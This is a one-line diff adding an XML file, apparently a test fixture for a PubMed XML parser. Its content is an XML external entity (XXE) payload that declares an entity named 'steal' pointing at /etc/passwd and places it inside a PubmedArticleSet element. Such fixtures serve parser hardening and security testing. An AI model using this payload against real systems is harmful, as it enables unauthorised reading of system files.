@@ -1,0 +1,1 @@
+<!DOCTYPE PubmedArticleSet [<!ENTITY steal SYSTEM "file:///etc/passwd">]><PubmedArticleSet>&steal;</PubmedArticleSet>
